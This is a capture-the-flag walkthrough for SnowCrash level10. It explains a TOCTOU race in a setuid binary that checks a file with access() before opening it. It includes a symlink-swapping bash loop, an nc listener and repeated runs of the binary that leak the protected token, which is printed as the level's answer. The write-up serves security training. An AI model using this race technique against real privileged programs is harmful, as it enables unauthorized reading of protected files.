# Security Vulnerability for Level10

The security flaw is a **TOCTOU race condition**, where the program checks a file's permissions before opening it, allowing the file to be replaced with a symlink to a protected file in between.

## Finding the Password for the `level11` User

### 1. Inspect the Directory `/home/user/level10`

```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

### 2. Inspect `level10` File

Execute `level10`:
```bash
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```
The program requires 2 arguments: file to be sent and IP where it should be sent.

### 3. Send Any File to Localhost

```bash
level10@SnowCrash:~$ ./level10 level10 127.0.0.1
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
```

We see that the program tries to connect to localhost via port 6969.

Show the network connections and listening ports:
```bash
netstat -tulpn
```

Result: no process listening on port 6969.

We need to start a process that will listen on a TCP port 6969:
```bash
nc -l 6969
```
The nc (or netcat) utility is used for just about anything under the sun involving TCP or UDP. It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.

Result: the server is listening on port 6969:
```bash
tcp        0      0 0.0.0.0:6969            0.0.0.0:* 
```

Try again to send any file to localhost:
```bash
level10@SnowCrash:~$ ./level10 level10 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
```

We see the contents of this file on the terminal where server is listening.

### 4. Send `token` File to Localhost

The main task is to send `token` file using `level10` executable  to see the password.
```bash
level10@SnowCrash:~$ ./level10 token 127.0.0.1
You don't have access to token
```

The program doesn't allow to send this file.  
Inspect how it is checked in code:
```bash
strings level10 
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
socket
fflush
exit
htons
connect
puts
__stack_chk_fail
printf
__errno_location
read
stdout
inet_addr
open
access
strerror
__libc_start_main
write
GLIBC_2.4
GLIBC_2.0
PTRh
UWVS
[^_]
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 .. 
```

This time there is no word `token` directly in the code. From the listed function `access` could be the function that checks the permissions before send a file.

The program checks file with access, opens it and sends it to the listener on the port 6969.

We can exploit TOCTOU.
#### What is TOCTOU

Time of check to time of use (TOCTOU) is a race condition vulnerability where a system checks a condition like file access or a credential and later uses the result of that check, leaving a window for an attacker to change the resource in between.

To exploit TOCTOUT race conditions, write a script in any directory where it is allowed:

```bash
#!/bin/bash

while true
do
        touch /tmp/malicious_file
        rm /tmp/malicious_file
        ln -s /home/user/level10/token /tmp/malicious_file
        rm /tmp/malicious_file
done
```

- give 777 permissions to your script;
- start a listening TCP server on port 6969;
- run the bash script;
- send the file to the listener;

```bash
./level10 /tmp/malicious_file 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
```

The result received:
```bash
.*( )*.
```

This is an empty message, we need to make a lot of executions rapidly to create a race conditions.
Make a loop instead of a single execution:
```bash
while true; do ./level10 /tmp/malicious_file 127.0.0.1; done
```

The result:
```bash
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
```
A lot of empty lines but sometimes we see the token's content -> password for `flag10` user.

### 5. Get the Password for the Next Level

Use the getflag command to retrieve the password for the next level.